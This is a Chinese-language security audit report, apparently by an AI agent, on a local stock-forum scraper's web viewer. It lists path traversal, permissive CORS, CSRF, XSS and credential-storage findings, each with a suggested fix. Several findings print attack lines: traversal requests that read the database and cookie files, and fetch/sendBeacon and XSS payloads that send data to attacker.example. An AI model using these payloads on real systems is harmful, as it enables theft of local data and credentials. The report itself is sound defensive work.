# 安全专项测试报告（只读审计，未修改任何代码 / 数据）

- 被测对象：`stock-forum-scraper`（`F:\AI Agent部署知识库\2026-09-22-11-49-42\stock-forum-scraper`）
- 运行实例：`http://127.0.0.1:8765`（Python 3.13.14，项目 venv）
- 测试时间：2026-09-22
- 测试方式：**静态代码审计 + 无害只读动态探测**
- 探测脚本（新增的 QA 脚本，非产品代码）：
  - `tools/_qa_security_probe.py` / `_qa_security_probe.out`
  - `tools/_qa_security_probe2.py` / `_qa_security_probe2.out`
  - `tools/_qa_security_probe3.py` / `_qa_security_probe3.out`

---

## 一、审计范围与方法

### 1.1 范围

| 类别 | 覆盖内容 |
| --- | --- |
| HTTP 入口 | `viewer/server.py` 全部 `do_GET` 路由、`_do_POST` 全部 5 个写路由、`_send_json` / `_send_file` / `main` |
| 数据层 | `viewer/db.py` 全部 SQL 语句（含 `executescript` / `ALTER TABLE` / 动态表名） |
| 前端 | `viewer/static/app.js` 全部 `innerHTML` 拼接点与 `esc()` |
| 凭据 | `scraper/credentials.py`、`scraper/session.py`、`config/*.yaml`、`credentials.example.yaml` |
| 出网 | `overseas/sources.py`、`overseas/*` 的 TLS 配置 |
| 仓库卫生 | 项目内明文敏感文件、`.gitignore`、DB 备份、浏览器配置目录 |
| 启动器 | `viewer/launch.py`、`viewer/desktop_app.py` |

### 1.2 方法

1. **静态审计**：逐行读码（`Read` / `Grep`），确认数据流与判据，不依赖推测。
2. **只读动态验证**：
   - 原始 socket 直接发送 `GET` 请求行（不做 URL 规范化），用于验证路径穿越；**不能用 urllib / 浏览器**，因为二者会把 `..` 规范化掉，测不到真实行为。
   - `urllib.request.build_opener(urllib.request.ProxyHandler({}))` 绕过 `http_proxy=127.0.0.1:55035`，用于检查响应头与错误处理。

### 1.3 只读声明（硬性约束遵守情况）

- **未执行任何写操作**：`/api/fetch`、`/api/demo`、`/api/sync_names`、`POST /api/overseas`、`/api/login_check` 全部**一次都没有实际调用**。
- CSRF / 鉴权缺失的结论，全部基于**代码级"缺失的防御措施"论证**（`server.py:632-687`），并已在 `[C]` 段以表格形式记录，未做浏览器实弹触发。
- 未修改 `viewer/app.db`、未修改任何源码、未重启服务。
- 未读取 / 未打印任何 Cookie、密钥、密码明文；涉及敏感文件时只记录**状态码与字节数**，`app.db` / Chrome Cookie 库只取文件头（`b'SQLite format 3\x00'`，不含任何业务数据）。
- 报告中对唯一出现的账号标识做了打码（前 4 位 + `***`）。

---

## 二、风险清单

### P0-1 ｜ 静态文件路径穿越 → 同盘任意文件读取（含数据库、Cookie、源码）

- **位置**：`viewer/server.py:546-549`（判据）、`viewer/server.py:563-567`（调用点）
- **类型**：CWE-22 Path Traversal / CWE-73 外部可控文件名
- **现象与证据**

  判据为字符串前缀比较，且 `Path` 不会折叠 `..`：

  ```python
  # server.py:546-549
  def _send_file(self, path: Path, ctype: str):
      if not path.exists() or not str(path).startswith(str(STATIC_DIR)):
          self.send_error(404)
          return
  ```

  ```python
  # server.py:563-567
  if route.startswith("/static/"):
      rel = route[len("/static/"):]
      ...
      self._send_file(STATIC_DIR / rel, ctype)
  ```

  `str(STATIC_DIR / "../server.py")` == `...\viewer\static\..\server.py`，**仍以 `...\viewer\static` 开头**，`startswith` 判据被绕过；`path.exists()` 与 `read_bytes()` 由操作系统解析 `..`，读到的就是真实文件。

  **实测（原始 socket，未规范化 URL）**：

  | 请求 | 响应 | Content-Length |
  | --- | --- | --- |
  | `GET /static/../server.py` | **200 OK** | 31482（正文即 `server.py` 源码） |
  | `GET /static/../db.py` | **200 OK** | 51829 |
  | `GET /static/../../main.py` | **200 OK** | 9988 |
  | `GET /static/../../viewer/app.db` | **200 OK** | **917504**（文件头 `b'SQLite format 3\x00'`） |
  | `GET /static/../../viewer/app.db.bak-20260922-230629` | **200 OK** | 933888（数据库备份） |
  | `GET /static/../../tools/_cookies_latest.json` | **200 OK** | 7554（**明文 Cookie 导出文件**） |
  | `GET /static/../../tools/_user_tgbuser_only.json` | **200 OK** | 28（账号标识） |
  | `GET /static/../../.browser-profile/Default/Network/Cookies` | **200 OK** | 28672（Chrome Cookie 库） |
  | `GET /static/..\server.py`（Windows 反斜杠） | **200 OK** | 31482 |
  | `GET /static/subdir/../../../viewer/server.py`（不存在的中间目录不影响） | **200 OK** | 31482 |
  | `GET /static/%2e%2e%2fserver.py` | 404 | — |
  | `GET /static/..%2fserver.py` | 404 | — |
  | `GET /static/..%5cserver.py` | 404 | — |
  | `GET /static//../server.py` | 404 | — |
  | `GET /static/....//server.py` | 404 | — |
  | `GET /static/../__not_exist__.py` | 404（对照组） | 330 |

  **专项结论（针对任务书列出的 4 个问题）**：

  1. `rel` 含 `../` 时，`Path(STATIC_DIR) / rel` **确实逃出 `STATIC_DIR`**，`startswith` 判据失效 → 已实测证实。
  2. `startswith` 的**前缀误判**在当前目录树中**不存在可利用兄弟目录**：`viewer/` 下只有 `static/`，没有 `static_xxx` / `static2` 之类同前缀目录（`Glob viewer/*` 与 `viewer/static/**` 已核对）。因此该点是**潜在缺陷（latent）而非现存漏洞**；但即便未来新增同前缀目录，也已被 `..` 穿越覆盖，属同一处修复点。
  3. `urlparse` **不解码** `%2e%2e%2f`（`parsed.path` 保留百分号字面量），故 `%2e%2e%2f` / `..%2f` / `..%5c` 三种编码绕过**均不可行**（实测 404，因为被当成含 `%` 的文件名查找）。**只有裸 `../` 与裸 `..\` 可行。**
  4. 可达边界：**同一盘符（F:）内任意文件**。跨盘符不可达：`GET /static/../C:/Windows/win.ini` → 404（拼出的路径不再以 `STATIC_DIR` 开头，判据反而拦住了）。因此 `C:\Users\...\.workbuddy\stock-scraper-creds\.key`（Fernet 密钥，在 C: 盘）**不可经此漏洞读取**，但 F: 盘上的一切（含 `.browser-profile` 整套 Chrome 配置）都可读。
     附带限制：路径含**空格**或**非 ASCII（中文）**的文件名读不到 —— 请求行中的空格会触发 `400 Bad request syntax`，百分号编码又不会被解码（如 `Local State`、中文名文件均 404），这是运气而非设计。

- **攻击路径**
  ```
  GET /static/../server.py HTTP/1.1
  Host: 127.0.0.1:8765

  GET /static/../../viewer/app.db HTTP/1.1
  Host: 127.0.0.1:8765

  GET /static/../../tools/_cookies_latest.json HTTP/1.1
  ```
  本机任意进程 / 任意脚本（`curl --path-as-is`、Python 原始 socket）均可直接发起。浏览器 `fetch()` 会规范化 `..`，所以**该条对"网页"不直接可用**，但**对"本机任意代码/低权限进程"完全可用**——一旦有任何本地代码执行面（下载的 exe、npm 包 postinstall、其他有漏洞的本地服务），即可无门槛拖走整个数据库与凭据。

- **影响**
  - 完整拖库：`viewer/app.db` 917 KB（含 `raw_pages` 全量原始 HTML、帖子、交易、持仓、人员）→ 数据泄露。
  - 源码泄露（`server.py` / `db.py` / `main.py`），为后续攻击提供完整白盒信息。
  - **明文 Cookie 导出文件**（`tools/_cookies_latest.json`、`tools/cookies.prev-anon.json`）与 `tools/_user_tgbuser_only.json`（账号标识）可读 → 会话/账号风险。
  - 整套 Chrome 用户配置目录可读：`Cookies`（实测 200 / 28672 B）、`Login Data`（保存的密码库；因含空格无法经此路径直接取，但可经 `..` 组合其他路径或本机其他手段）、`Local State`（DPAPI 包裹的 Cookie 解密密钥载体）→ 本地攻击者可离线尝试解密。
  - 数据库备份 `app.db.bak-*` 可读 → 即使主库被清理，历史数据仍在。

- **建议修法（代码级）**

  ```python
  # server.py，替换 _send_file 的判据
  STATIC_ROOT = STATIC_DIR.resolve()

  def _send_file(self, path: Path, ctype: str):
      try:
          p = path.resolve(strict=True)          # 折叠 .. 与符号链接，且必须存在
      except (OSError, RuntimeError):
          self.send_error(404); return
      # 关键：用 resolve 后的真实路径做边界判断（is_relative_to 而非 startswith）
      if not p.is_relative_to(STATIC_ROOT) or not p.is_file():
          self.send_error(404); return
      data = p.read_bytes()
      ...
  ```

  并在 `do_GET` 的静态分支**先做白名单校验**，从根上杜绝穿越：

  ```python
  if route.startswith("/static/"):
      rel = urllib.parse.unquote(route[len("/static/"):])   # 若要支持 %20 再解码
      if not rel or rel.startswith(("/", "\\")) or ".." in rel.replace("\\", "/").split("/"):
          self.send_error(404); return
      if Path(rel).suffix.lower() not in {".js", ".css", ".html", ".svg", ".png", ".ico", ".woff2"}:
          self.send_error(404); return
      ...
  ```

  另加两点加固：① `str(...).startswith(...)` 全项目禁用，统一改 `Path.is_relative_to`；② 顺带 `_send_file` 里对 `read_bytes()` 加 `try/except OSError → 404`（见 P3-1）。

---

### P1-1 ｜ 无条件下发 `Access-Control-Allow-Origin: *`，任意网页可跨源读取本机全部数据

- **位置**：`viewer/server.py:537-544`
- **类型**：CWE-942 过于宽松的跨域策略 / CWE-346 源验证缺失
- **现象与证据**

  ```python
  def _send_json(self, obj, code=200):
      ...
      self.send_header("Access-Control-Allow-Origin", "*")   # server.py:542，无条件
  ```

  实测（`urllib` 显式禁用 proxy）：

  | 请求 | 状态 | `Access-Control-Allow-Origin` |
  | --- | --- | --- |
  | `GET /api/summary`（带 `Origin: https://evil.example`） | 200 | `*` |
  | `GET /api/overseas_hotspots`（带 `Origin: https://evil.example`） | 200 | `*` |
  | `GET /static/app.js` | 200 | **（缺失）** |
  | `GET /api/__nope__`（404） | 404 | （缺失） |

  服务端**没有任何鉴权**（本就是"纯本地、个人使用"设计，`server.py:4` 注释明示），也没有任何来源校验，而 `*` 意味着浏览器**允许任意站点读取响应正文**。

- **攻击路径**
  ```javascript
  // 任意网站上的一段脚本（用户浏览器打开该站点时执行）
  const r = await fetch("http://127.0.0.1:8765/api/overseas_hotspots");
  const data = await r.json();               // ACAO:* → 跨源可读，成功拿到全量数据
  navigator.sendBeacon("https://attacker.example/collect", JSON.stringify(data));
  ```
  也可经 **DNS rebinding** 放大：`server.py` **完全不校验 `Host` 头**（实测 `Host: evil.example`、`Host: attacker.local`、空 `Host` 均返回 `200 OK`），攻击者可用自有域名解析到 `127.0.0.1` 后以同源身份访问。

- **影响**：访问任意恶意网页即可批量窃取本机舆情库（帖子原文、博主昵称、持仓与交易明细、原始 HTML）。**缓解因素**：Chromium 的 Private Network Access（PNA）在较新版本会对「公网页面 → 本地地址」的 fetch 施加限制，可能拦截该链路；但 Firefox / Safari 无此限制，且 PNA 不覆盖全部路径。故定级 P1 而非 P0。

- **建议修法**

  ```python
  ALLOWED_ORIGINS = {f"http://127.0.0.1:{PORT}", f"http://localhost:{PORT}"}

  def _send_json(self, obj, code=200):
      body = json.dumps(obj, ensure_ascii=False).encode("utf-8")
      origin = self.headers.get("Origin")
      self.send_response(code)
      self.send_header("Content-Type", "application/json; charset=utf-8")
      self.send_header("Content-Length", str(len(body)))
      if origin and origin in ALLOWED_ORIGINS:            # 仅回显白名单来源
          self.send_header("Access-Control-Allow-Origin", origin)
          self.send_header("Vary", "Origin")
      self.end_headers()
      self.wfile.write(body)
  ```

  更彻底的方案：**直接不要 CORS 头**（前端与 API 同源，本不需要跨源），并对 `Host` 头做白名单校验（见 P1-2）。

---

### P1-2 ｜ 写接口零鉴权 / 零 CSRF 防护 / 不校验 `Origin`、`Referer`、`Host`、`Content-Type`

- **位置**：`viewer/server.py:632-687`（`do_POST` / `_do_POST` 全部分派）、`viewer/server.py:637-643`（请求体解析）、`viewer/server.py:695`（bind 地址）
- **类型**：CWE-352 CSRF / CWE-306 关键功能缺失鉴权 / CWE-346 源验证缺失
- **现象与证据（代码级论证，未实际发起写请求）**

  `_do_POST` 只做 `route` 字符串比对，**从头到尾没有读取** `Origin` / `Referer` / `Host` / 任何 token / 任何自定义头：

  | 端点 | Content-Type 校验 | Origin/Referer 校验 | CSRF token | 自定义头 |
  | --- | --- | --- | --- | --- |
  | `POST /api/login_check` | 无 | 无 | 无 | 无 |
  | `POST /api/fetch` | 无 | 无 | 无 | 无 |
  | `POST /api/demo` | 无 | 无 | 无 | 无 |
  | `POST /api/overseas` | 无 | 无 | 无 | 无 |
  | `POST /api/sync_names` | 无 | 无 | 无 | 无 |

  两个关键细节放大了危害：

  1. **Content-Type 完全不看**，且解析失败被**静默降级为 `{}`**：

     ```python
     # server.py:638-643
     length = int(self.headers.get("Content-Length", 0))
     body = self.rfile.read(length) if length else b"{}"
     try:
         payload = json.loads(body.decode("utf-8")) if body else {}
     except Exception:
         payload = {}
     ```

     于是 `Content-Type: text/plain`（**简单请求、不触发预检**）的表单/`fetch` 也能命中，且 `payload={}` 后各接口**用默认参数继续执行**：`/api/fetch` → `sites = _sites()`（真抓取）；`/api/demo` / `/api/overseas` 甚至不需要 body。

  2. **不校验 `Host` 头**（实测见 P1-1），DNS rebinding 可直接绕过"只有 127.0.0.1 才连得上"的隐含假设。

- **攻击路径**
  ```html
  <!-- 用户浏览器打开任意恶意页面时，静默触发本机抓取/写库 -->
  <form id="f" action="http://127.0.0.1:8765/api/demo" method="POST">
    <input name="x" value="1">
  </form>
  <script>document.getElementById('f').submit();</script>

  <!-- 或 -->
  <script>
  fetch("http://127.0.0.1:8765/api/fetch", {
    method: "POST", mode: "no-cors",
    headers: {"Content-Type": "text/plain"}, body: "{}"
  });   // payload 解析失败 → {} → 走默认站点，真实联网抓取并写库
  </script>
  ```

- **影响**：任意网页可在用户本机触发**真实联网抓取、写库、载入示例数据、覆盖海外舆情**；配合 CORS `*`（P1-1）攻击者还能读取执行结果。写接口共用 `_WRITE_LOCK`（`server.py:20,634`）串行化，恶意请求可长时间占用写锁，造成本地服务性能退化。缓解因素同 P1-1（PNA）。

- **建议修法**

  ```python
  ALLOWED_ORIGINS = {f"http://127.0.0.1:{PORT}", f"http://localhost:{PORT}"}
  ALLOWED_HOSTS = {f"127.0.0.1:{PORT}", f"localhost:{PORT}", f"[::1]:{PORT}"}

  def _origin_ok(self) -> bool:
      # 1) Host 必须白名单（挡 DNS rebinding）
      if (self.headers.get("Host") or "").strip() not in ALLOWED_HOSTS:
          return False
      # 2) 有 Origin 时必须白名单；无 Origin 的写请求一律拒绝
      origin = self.headers.get("Origin")
      if not origin:
          return False
      return origin in ALLOWED_ORIGINS

  def _do_POST(self):
      if not self._origin_ok():
          return self._send_json({"error": "forbidden"}, code=403)
      if not (self.headers.get("Content-Type") or "").startswith("application/json"):
          return self._send_json({"error": "unsupported media type"}, code=415)
      ...
      try:
          payload = json.loads(body.decode("utf-8")) if body else {}
      except Exception:
          return self._send_json({"error": "bad json"}, code=400)   # 不再静默降级为 {}
  ```

  可选加一道本地一次性 token：`main()` 启动时 `secrets.token_urlsafe(32)` 写入 `viewer/static/index.html` 模板或 `localStorage` 引导接口，所有写请求带 `X-Viewer-Token` 头校验——成本低、对"桌面单实例"场景完全可行。

---

### P2-1 ｜ 前端 `esc()` 不转义引号 → 属性逃逸型 XSS（注入源为第三方抓取内容）

- **位置**：
  - `esc()` 实现：`viewer/static/app.js:19-21`
  - 属性上下文调用点（**全部**）：`app.js:248`、`app.js:344`、`app.js:384`、`app.js:94`、`app.js:834`、`app.js:909`、`app.js:331`（`href`）
- **类型**：CWE-79 跨站脚本（属性注入）
- **现象与证据**

  ```javascript
  // app.js:19-21 —— 只转义 & < >，未处理 " 与 '
  function esc(s) {
    return (s ?? "").toString().replace(/[&<>]/g, (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;" }[c]));
  }
  ```

  而 `esc()` 被用在**属性值**位置：

  ```javascript
  // app.js:248（人物列表，p.name 来自 posts.author —— 第三方昵称）
  `<tr data-name="${esc(p.name)}" style="cursor:pointer">`

  // app.js:344（选手列表，p.name 来自 players.name —— 抓取的选手昵称）
  `<tr data-name="${esc(p.name)}" data-ch="${esc(p.channel || '')}" data-tier="${esc(t)}">`

  // app.js:834（人物详情持仓徽章，tip 含 hold_since —— 来自帖子解析）
  `... title="${esc(tip)}">`

  // app.js:331（来源链接，url 为第三方新闻/帖子 URL）
  `<a href="${esc(url)}" target="_blank" ...>`
  ```

  由于 `"` 未被转义，**不需要 `<`/`>` 即可逃出属性**，进而注入事件处理属性：

  ```
  昵称 = ok" onmouseover="fetch('https://attacker.example/x?d='+document.body.innerText)
  → 渲染结果：<tr data-name="ok" onmouseover="fetch(...)" style="cursor:pointer">
  ```

  **第三方不可信内容清单（按调用点）**：

  | 调用点 | 数据字段 | 来源 | 接口 |
  | --- | --- | --- | --- |
  | `app.js:248`（`data-name`） | `p.name` | 股吧帖子作者昵称（第三方） | `/api/persons` ← `posts.author` |
  | `app.js:344`（`data-name`） | `p.name` | 抓取到的选手昵称（第三方） | `/api/players` ← `players.name` |
  | `app.js:834` / `909`（`title`） | `hold_since` 拼接串 | 帖子正文解析出的建仓日期 | `/api/person` / `/api/player` |
  | `app.js:331`（`href`） | `url` | 新闻/帖子原始链接（第三方） | `srcLink()` |
  | `app.js:94` / `384`（`data-sym`） | `symbol` | 帖子文本中正则抽取的代码 | `/api/stocks` / `/api/consensus` |

  标签级注入被 `<`/`>` 转义挡住（`&lt;img ...&gt;` 不会成为标签），但**属性级注入成立**，足以执行 JS（事件属性）。`innerHTML` 汇聚点：`app.js:47/58/144/237/248/250/262/274/355/395/485/518/592/649` 等。

- **攻击路径**：抓取源（股吧/东财/雪球…）中投毒一条昵称或标题 → 入库 → 用户打开查看器对应面板 → `innerHTML` 渲染 → 属性逃逸 → 脚本在 `http://127.0.0.1:8765` 源执行（可读取全部 API + 调用写接口，等同 P1-2 的完全控制）。
  说明：**本次未做浏览器实弹验证**（需先污染 DB，属写操作），结论为代码级推导。

- **建议修法**：补齐引号转义，并优先改用 DOM API。

  ```javascript
  // 最小修复：补 " 与 '
  function esc(s) {
    return (s ?? "").toString().replace(/[&<>"']/g, (c) => (
      { "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c]));
  }
  ```

  ```javascript
  // 更稳妥：URL 只允许 http/https，禁止 javascript:/data:
  function safeHref(u) {
    const s = String(u ?? "").trim();
    return /^https?:\/\//i.test(s) ? s : "";
  }
  // 用法：const h = safeHref(url);
  //      h ? `<a href="${esc(h)}" ...>` : `<span>${esc(label)}</span>`
  ```

  长期建议：`data-*` 属性改由 `dataset` 赋值、文本改 `textContent`、列表改用 `createElement`；`innerHTML` 仅保留在完全静态模板上。全套改完后加一条 `Content-Security-Policy: default-src 'self'; script-src 'self'` 响应头做兜底（见 P3-4）。

---

### P2-2 ｜ 项目目录内散落明文 Cookie / 账号标识 / Chrome 用户配置 / 数据库备份，且无 `.gitignore`

- **位置**：`tools/cookies.prev-anon.json`、`tools/_cookies_latest.json`、`tools/_edge_cookies.json`、`tools/_user_tgbuser_only.json`、`tools/_user_partial.json`、`tools/_probe_login_flow.json`、`.browser-profile/**`、`viewer/app.db.bak-20260922-230546`、`viewer/app.db.bak-20260922-230629`、项目根（**无 `.gitignore`**）
- **类型**：CWE-312 敏感信息明文存储 / CWE-540 源码中包含敏感信息 / CWE-538 文件与目录暴露
- **现象与证据**

  | 文件 | 内容 | 性质 |
  | --- | --- | --- |
  | `tools/_cookies_latest.json` | `{"url":"https://www.tgb.cn/", "cookies":[{name,value,domain,...}]}` —— 实测**含 tgb.cn 域下多个 cookie 值**（如 `gdp_user_id`=`gioenc-…`、`_c_WBKFRo`=32 位串），**明文 JSON** | 会话/反爬凭据明文 |
  | `tools/cookies.prev-anon.json` | 同类结构 cookie 导出（anon 态） | 凭据导出物 |
  | `tools/_user_tgbuser_only.json` | `{"tgbuser": "1529***"}` | 账号标识（已打码） |
  | `tools/_probe_login_flow.json` | 含本机绝对路径 `C:\Users\野比&~1\AppData\Local\Temp\...` | 主机信息 |
  | `tools/_calib_u0.html` / `_probe_*.html` | 抓取到的整页 HTML | 抓取物散落 |
  | `.browser-profile/**` | 整套 Chrome 用户配置（`Default/Network/Cookies`、`Login Data`、`Local State`…） | 高价值凭据载体 |
  | `viewer/app.db.bak-*` | 两份完整数据库备份（各 ~0.9 MB） | 数据副本 |

  仓库卫生：项目根**没有 `.gitignore`**（`Glob` 仅命中 `.venv/.gitignore`，那是 venv 自带的）。虽然当前目录**不是 git 仓库**，但一旦 `git init` + `git add .`，上述所有内容（含 `.browser-profile`、DB 备份、Cookie JSON）会**一次性全部入库**。

- **攻击路径**：① 经 P0-1 路径穿越直接读取（已实测 `_cookies_latest.json`、`_user_tgbuser_only.json` 均 200）；② 误提交/分享项目目录给他人；③ 云盘/IM 同步整个目录。
  影响面：tgb.cn 的账号与反爬 token 泄露；Chrome 配置泄露可能连带其他站点的登录态；`app.db` 与备份泄露全部抓取数据；`pyvenv.cfg`（实测 200）泄露 `C:\Users\野比&大熊\.workbuddy\binaries\...` 本机路径。

- **建议修法**
  1. 项目根新增 `.gitignore`：

     ```
     .venv/
     .browser-profile/
     *.db
     *.db-wal
     *.db-shm
     *.db.bak-*
     tools/_*.json
     tools/_*.html
     tools/*.png
     __pycache__/
     *.pyc
     ```
  2. 把 Cookie 导出脚本的输出目录从 `tools/` 改到 **用户配置目录**（与现有凭据存储一致）：
     `Path(os.path.expanduser("~/.workbuddy/stock-scraper-creds/exports"))`，并复用 `credentials.save_cookies()` 走 Fernet 加密落盘，而不是留 JSON 明文。
  3. 清理历史遗留：删除 `tools/` 下所有 `_*.json` / `_*.html` 与 `viewer/app.db.bak-*`（本项属"修复"，本次未执行）。
  4. 给重要 JSON/HTML 产物统一加 `_private/` 目录 + 该目录进 `.gitignore`。

---

### P2-3 ｜ 凭据密钥文件的"仅当前用户可读"在 Windows 上不成立

- **位置**：`scraper/credentials.py:16-17`（文档承诺）、`scraper/credentials.py:37-40`、`55-58`（`chmod` 实现）
- **类型**：CWE-732 权限分配不当 / CWE-276 默认权限错误
- **现象与证据**

  ```python
  # credentials.py:16-17（docstring 承诺）
  # - 密钥文件权限 600，仅当前用户可读；凭据以密文落盘，不存明文、不上传。
  # credentials.py:37-40
  try:
      KEY_FILE.chmod(0o600)
  except OSError:
      pass
  ```

  在 Windows 上 `os.chmod` **只影响只读位**，不设置 ACL，其他本机用户仍可读取该文件；`KEY_FILE` 与 `CRED_FILE` 又在**同一目录**（`~/.workbuddy/stock-scraper-creds/`），拿到目录即可同时拿到密钥与密文，Fernet 加密退化为"混淆"。代码对 `OSError` 静默吞掉，用户不会被告知权限实际未生效。

- **攻击路径**：本机其他用户账户 / 备份与同步工具读取 `~/.workbuddy/stock-scraper-creds/` 下的 `.key` 与 `credentials.enc` → 解密出账号密码与 Cookie。
  缓解：该目录在 **C: 盘**，**不能被 P0-1 穿越读取**（已实测跨盘符不可达），因此实际风险等级为 P2 而非 P0。

- **建议修法**

  ```python
  import subprocess, sys

  def _restrict(path: Path) -> None:
      """Windows 用 icacls 收紧 ACL；POSIX 用 chmod。"""
      if sys.platform == "win32":
          user = os.environ.get("USERNAME", "")
          subprocess.run(["icacls", str(path), "/inheritance:r",
                          "/grant:r", f"{user}:(R,W)"], check=False,
                         capture_output=True)
      else:
          path.chmod(0o600)
  ```

  并在失败时 `logger.warning`（当前是 `except OSError: pass`，静默）。更稳的做法：改用 **Windows DPAPI**（`ctypes` 调 `CryptProtectData`）代替"自管密钥文件"，从根上消除"密钥与密文同目录"的问题。

---

### P2-4 ｜ 海外数据源关闭 TLS 证书与主机名校验（影响范围仅限该模块）

- **位置**：`overseas/sources.py:35-37`（定义）、`overseas/sources.py:176`（唯一使用点）
- **类型**：CWE-295 证书校验不当
- **现象与证据**

  ```python
  # overseas/sources.py:35-37
  _SSL = ssl.create_default_context()
  _SSL.check_hostname = False
  _SSL.verify_mode = ssl.CERT_NONE
  # overseas/sources.py:176
  with urllib.request.urlopen(req, timeout=timeout, context=_SSL) as r:
  ```

  **专项结论（对任务书"是否全局生效"的核实）**：**不是全局关闭**。项目里**不存在** `ssl._create_default_https_context = ssl._create_unverified_context` 这类 monkey-patch（全仓 grep 无命中），`_SSL` 是**模块级局部对象**，只在该模块第 176 行的这一次 `urlopen` 调用中显式传入。
  → **影响范围**：仅 `overseas/sources.py` 的海外新闻抓取链路（`overseas/collect` → `sources`）。**抓取器主链路不受影响**：`scraper/session.py:43` 用 `requests.Session()`，默认 `verify=True`（`requirements.txt` 用 requests），TLS 校验**正常开启**；viewer 后端不做出网抓取（出网动作都在被 `/api/*` 调用的子模块里），故也不受影响。
  → **能拿到什么**：中间人（或恶意代理，注意本机 `http_proxy` 确实被配置为 `127.0.0.1:55035`）可**无提示地替换/篡改**海外新闻内容与情绪判定结果——写入 `overseas_news` 后直接影响"热点—板块涨跌预判"结论，且不会报任何证书错误。

- **攻击路径**：控制网络路径（公共 WiFi、企业代理、本机代理进程）→ 以自签证书冒充 CNBC/Reuters 等 RSS 源 → 注入伪造新闻与"看多/看空"标签 → 污染决策输出。
- **建议修法**

  ```python
  # 默认恢复校验；确有个别源证书链异常时，只对该源单独降级并显式记录
  _SSL = ssl.create_default_context()          # 删除 check_hostname/verify_mode 两行
  # 如需兜底（仅针对 pki 链不完整的源）：
  # _SSL = ssl.create_default_context(cafile=...)  # 补 CA，而不是关校验
  ```

  并在 `SourceResult` 中把"证书校验被降级"作为一种状态如实上报（该项目已有"诚实状态"设计，`sources.py:12-13`，此处正好延续）。

---

### P3-1 ｜ 未捕获异常导致连接静默中断（服务端 traceback，客户端无响应）

- **位置**：`viewer/server.py:598`、`603`、`627`（URL 参数直接 `int()` 强转）、`viewer/server.py:246-266` 的 `read_bytes()` 无兜底、`viewer/server.py:557-568`（静态分支）
- **类型**：CWE-248 未捕获异常 / 拒绝服务（轻度）
- **现象与证据（实测）**

  | 请求 | 结果 |
  | --- | --- |
  | `GET /api/posts?limit=abc` | `RemoteDisconnected: Remote end closed connection without response`（**无任何响应体**） |
  | `GET /api/consensus?min_holders=x` | 同上 |
  | `GET /api/detail?id=xyz` | 同上 |
  | `GET /static/`、`GET /static/..`、`GET /static/.`、`GET /static/../static` | 读到的 `bytes_read=0`（对**目录**调用 `read_bytes()` 抛 `IsADirectoryError`，连接被直接掐断） |

  说明：`log_message` 被覆写为空（`server.py:689-690`），但异常仍会由 `ThreadingHTTPServer` 打到 stderr，**服务端留下 traceback**；客户端只看到连接中断。

- **影响**：单个恶意/错误请求即可造成请求失败与日志噪音；`/static/` 这类路径在正常使用中也可能被误触发（例如用户手输 URL）。不构成严重 DoS（线程模型下仅该连接受影响），列为 P3。
- **建议修法**

  ```python
  def _int_arg(q, key, default, lo=None, hi=None):
      try:
          v = int(q.get(key, [str(default)])[0])
      except (TypeError, ValueError):
          v = default
      if lo is not None: v = max(v, lo)
      if hi is not None: v = min(v, hi)
      return v
  # 用法：limit = _int_arg(q, "limit", 20, 1, 500)
  ```
  `_send_file` 内 `read_bytes()` 包 `try/except OSError: self.send_error(404)`（该修复与 P0-1 合并实现即可）。
  另建议在 `do_GET` / `do_POST` 顶层加 `try/except Exception → _send_json({"error": "internal"}, 500)`，彻底避免"无响应"。

---

### P3-2 ｜ 内部路径 / 环境信息泄露（经文件读取与错误页）

- **位置**：`viewer/server.py:630`、`687`（`send_error` 未自定义正文）；泄露源为项目文件本身
- **类型**：CWE-209 错误信息泄露 / CWE-200 信息暴露
- **现象与证据**：`/static/../../.venv/pyvenv.cfg` 实测 **200**，正文含 `home = C:\Users\野比&大熊\.workbuddy\binaries\python\versions\3.13.12`（泄露用户名、解释器路径、宿主环境）；404 错误页为标准 `BaseHTTPRequestHandler` 页面（`<h1>Error response</h1>`，330 B），**未泄露 traceback**，这一点是好的。
- **影响**：为本地攻击者提供路径/用户名情报，便于定位 P0-1 的读取目标与 P2-3 的凭据目录。
- **建议修法**：修掉 P0-1 后本项自然消失；另建议覆写 `send_error` 输出极简 `{"error": "not found"}` JSON，不返回 HTML 错误页。

---

### P3-3 ｜ 桌面版单实例锁可绕过（低优先级记录）

- **位置**：`viewer/desktop_app.py:49-64`（`CreateMutexW`）、`viewer/desktop_app.py:73-84`（`--allow-multi` / 端口复用）
- **类型**：CWE-1284 无效输入校验 / 逻辑绕过
- **现象与证据**
  - 互斥体名为 `Local\stock_forum_viewer_{PORT}`（`desktop_app.py:39`）——`Local\` 命名空间**按登录会话隔离**，同一台机器的**另一个 Windows 会话（快速用户切换 / RDP / 不同账号）可再起一个实例**，不会互斥。
  - `_port_in_use()`（`desktop_app.py:42-46`）只做 TCP 连接探测，**不校验对端是不是本程序**：任意进程只要先占住 8765，`desktop_app` 就会"直接复用"并打开窗口指向**攻击者控制的本地服务**（`desktop_app.py:81-82`）。
  - `--allow-multi` 显式放开多实例（调试用途，`desktop_app.py:73`）。
- **影响**：本地攻击者可先占用 8765，诱导桌面查看器把界面指向伪造服务（钓鱼/篡改展示）——前提是已具备本机代码执行能力，故仅作低优先级记录。
- **建议修法**：互斥体改 `Global\` 命名空间（并处理 `GetLastError()==5 拒绝访问` 的情况）；`_port_in_use()` 命中后请求一个带随机 nonce 的 `/api/ping`（由 `main()` 启动时生成）校验对端确为本程序，否则提示端口被占用并退出。

---

### P3-4 ｜ 无任何安全响应头；静态文件 MIME 按扩展名硬编码（类型混淆）

- **位置**：`viewer/server.py:546-555`（`_send_file` 无安全头）、`565-566`（MIME 推断）
- **类型**：CWE-693 保护机制失效 / CWE-430 类型处理不当
- **现象与证据（实测）**：`/api/summary`、`/static/app.js`、404 页均**缺少** `X-Content-Type-Options`、`X-Frame-Options`、`Content-Security-Policy`；且 `_send_file` 的 MIME 由**扩展名**推得，非 `.css/.js` 一律 `text/html` —— 于是 P0-1 读出的 `server.py` 被以 `Content-Type: text/html` 返回（实测），`app.db` 亦同。这会让浏览器"按 HTML 渲染"任意文件，并使 XSS（P2-1）缺少最后一道防线。
- **影响**：放大 P0-1 与 P2-1 的可利用性；缺少 CSP 使内联脚本注入无阻挡。
- **建议修法**：所有响应统一加

  ```python
  self.send_header("X-Content-Type-Options", "nosniff")
  self.send_header("X-Frame-Options", "DENY")
  self.send_header("Referrer-Policy", "no-referrer")
  self.send_header("Content-Security-Policy",
